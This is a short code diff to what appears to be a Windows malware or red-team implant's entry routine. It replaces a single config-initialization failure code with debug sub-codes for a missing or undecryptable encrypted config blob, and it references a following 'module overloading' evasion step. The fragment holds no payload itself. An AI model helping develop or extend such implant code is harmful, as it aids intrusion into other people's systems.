@@ -110,8 +110,15 @@ void implant_entry(PVOID param) {
 
     /* ---- Step 4: Initialize config store ---- */
     status = cfg_init(&g_ctx);
-    if (!NT_SUCCESS(status))
-        DEV_FAIL(13);
+    if (!NT_SUCCESS(status)) {
+        /* Sub-codes: 130 = NULL ctx, 131 = no pic_base, 132 = blob not found,
+           133 = decrypt fail, 134 = parse fail, 139 = other */
+        if (status == 0xC0000002) DEV_FAIL(130);       /* STATUS_INVALID_PARAMETER */
+        if (status == 0xC0000034) DEV_FAIL(132);       /* STATUS_OBJECT_NAME_NOT_FOUND */
+        if (status == 0xC000003A) DEV_FAIL(133);       /* STATUS_OBJECT_PATH_NOT_FOUND (decrypt) */
+        if (status == 0xC0000005) DEV_FAIL(134);       /* STATUS_ACCESS_VIOLATION (parse) */
+        DEV_FAIL(139);
+    }
 
     /* ---- Step 4b: Module overloading (post-config) ---- */
     {
